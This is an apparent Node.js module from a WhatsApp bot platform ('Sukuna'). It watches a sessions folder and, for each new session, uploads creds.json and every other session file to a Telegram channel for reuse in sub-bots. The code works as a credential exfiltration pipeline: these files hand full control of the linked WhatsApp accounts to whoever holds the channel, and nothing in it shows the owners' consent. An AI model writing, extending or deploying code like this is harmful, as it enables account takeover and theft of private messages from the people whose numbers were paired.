/**
 * ═══════════════════════════════════════════════════════
 * 📡 TELEGRAM SESSION MONITOR | مراقب جلسات سوكونا
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 📜 الوصف: مراقبة فولدر الجلسات + إرسالها لقناة التليجرام
 * ═══════════════════════════════════════════════════════
 */

import { Telegraf } from 'telegraf'
import fs from 'fs'
import path from 'path'
import config from './config.js'

let bot = null
const processedSessions = new Set()
let isWatching = false

// ═══ إرسال إشعار بجلسة جديدة ═══
export async function notifyNewSession(botNumber, sessionPath) {
  if (!bot || !config.telegram.token || config.telegram.token.includes('ضع')) {
    console.log('⚠️ Telegram bot not configured')
    return false
  }

  try {
    const credsPath = path.join(sessionPath, 'creds.json')
    if (!fs.existsSync(credsPath)) return false

    const sessionFiles = fs.readdirSync(sessionPath)
    const sessionSize = sessionFiles.length

    const message = [
      '🕸 *جلسة بوت سوكونا جديدة جاهزة!*',
      '',
      '⊱⊹•─๋︩︪═╾═─•┈⧽┊🎭┊⧼┈•─═╼═─๋︩︪•⊹⊰',
      '',
      `📱 *رقم البوت:* \`${botNumber}\``,
      `📂 *عدد الملفات:* ${sessionSize}`,
      `🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}`,
      '',
      '⋄⊹•─๋︩︪╾─•┈ ⧼ ⇊ ⧽ ┈•─╼─๋︩︪•⊹',
      '',
      '> الجلسة جاهزة للاستخدام في البوتات الفرعية.',
      '',
      '📥 استخدم `/fetch_sessions` في بوت سوكونا الرئيسي لسحب الجلسة.'
    ].join('\n')

    // إرسال الرسالة للقناة/الجروب
    if (config.telegram.sessionsChannel) {
      await bot.telegram.sendMessage(
        config.telegram.sessionsChannel,
        message,
        { parse_mode: 'Markdown' }
      )

      // إرسال ملف creds.json كملف
      const credsBuffer = fs.readFileSync(credsPath)
      await bot.telegram.sendDocument(
        config.telegram.sessionsChannel,
        { source: credsBuffer },
        {
          caption: `📦 creds.json - البوت: ${botNumber}`,
          filename: `session_${botNumber}_creds.json`
        }
      )

      // إرسال باقي الملفات لو موجودة
      for (const file of sessionFiles) {
        if (file === 'creds.json') continue
        try {
          const filePath = path.join(sessionPath, file)
          const fileBuffer = fs.readFileSync(filePath)
          await bot.telegram.sendDocument(
            config.telegram.sessionsChannel,
            { source: fileBuffer },
            {
              caption: `📎 ${file} - البوت: ${botNumber}`,
              filename: `session_${botNumber}_${file}`
            }
          )
        } catch {}
      }

      console.log(`📡 [MONITOR] Session notification sent: ${botNumber}`)
      return true
    }
  } catch (e) {
    console.error('❌ Error sending session notification:', e.message)
  }

  return false
}

// ═══ فحص دوري للفولدر ═══
function startPeriodicCheck() {
  if (isWatching) return
  isWatching = true

  const subDir = config.subSessionsDir || './sessions/session-sub'

  if (!fs.existsSync(subDir)) {
    fs.mkdirSync(subDir, { recursive: true })
  }

  console.log(`👁️ [MONITOR] Watching for new sessions in: ${subDir}`)

  // فحص كل فترة
  setInterval(async () => {
    try {
      const sessions = fs.readdirSync(subDir)

      for (const session of sessions) {
        const sessionPath = path.join(subDir, session)
        const credsPath = path.join(sessionPath, 'creds.json')

        // لو الجلسة موجودة ومش متعالجة
        if (
          fs.statSync(sessionPath).isDirectory() &&
          fs.existsSync(credsPath) &&
          !processedSessions.has(session)
        ) {
          processedSessions.add(session)
          console.log(`🆕 [MONITOR] New session detected: ${session}`)
          await notifyNewSession(session, sessionPath)
        }
      }
    } catch (e) {
      console.error('❌ [MONITOR] Error watching sessions:', e.message)
    }
  }, config.telegram.checkInterval || 10000)

  // كمان fs.watch للاستجابة السريعة
  try {
    fs.watch(subDir, { recursive: true }, async (eventType, filename) => {
      if (filename === 'creds.json') {
        try {
          const dirName = path.dirname(path.join(subDir, filename))
          const botNumber = path.basename(dirName)

          if (!processedSessions.has(botNumber)) {
            processedSessions.add(botNumber)
            await notifyNewSession(botNumber, dirName)
          }
        } catch {}
      }
    })
  } catch {}
}

// ═══ تشغيل بوت التليجرام ═══
export async function startTelegramMonitor() {
  if (!config.telegram.token || config.telegram.token.includes('ضع')) {
    console.log('⚠️ Telegram token not configured. Session monitor disabled.')
    return
  }

  try {
    bot = new Telegraf(config.telegram.token)
    globalThis.sessionMonitorBot = bot

    // أمر /status
    bot.command('status', async (ctx) => {
      const subDir = config.subSessionsDir || './sessions/session-sub'
      let sessionCount = 0

      try {
        sessionCount = fs.readdirSync(subDir).filter(s => {
          try {
            return fs.existsSync(path.join(subDir, s, 'creds.json'))
          } catch { return false }
        }).length
      } catch {}

      await ctx.reply([
        '🕸 *حالة منصة سوكونا*',
        '',
        `📂 عدد الجلسات: ${sessionCount}`,
        `📡 المراقبة: شغالة ✅`,
        `⏱️ آخر فحص: ${new Date().toLocaleTimeString('ar-SA')}`
      ].join('\n'), { parse_mode: 'Markdown' })
    })

    // أمر /sessions
    bot.command('sessions', async (ctx) => {
      const subDir = config.subSessionsDir || './sessions/session-sub'
      let sessions = []

      try {
        sessions = fs.readdirSync(subDir).filter(s => {
          try {
            return fs.existsSync(path.join(subDir, s, 'creds.json'))
          } catch { return false }
        })
      } catch {}

      if (!sessions.length) {
        return ctx.reply('📭 مفيش جلسات حالياً.')
      }

      const list = sessions.map((s, i) => `${i + 1}. 📱 ${s}`).join('\n')
      await ctx.reply([
        '🕸 *الجلسات المتاحة:*',
        '',
        list,
        '',
        `📊 الإجمالي: ${sessions.length}`
      ].join('\n'), { parse_mode: 'Markdown' })
    })

    bot.launch()
      .then(() => {
        console.log('📡 [MONITOR] Telegram session monitor is running!')
      })
      .catch(err => {
        console.error('❌ [MONITOR] Telegram monitor error:', err.message)
      })

    // بدء المراقبة
    startPeriodicCheck()

  } catch (e) {
    console.error('❌ Failed to start Telegram monitor:', e.message)
  }
}

export default { startTelegramMonitor, notifyNewSession }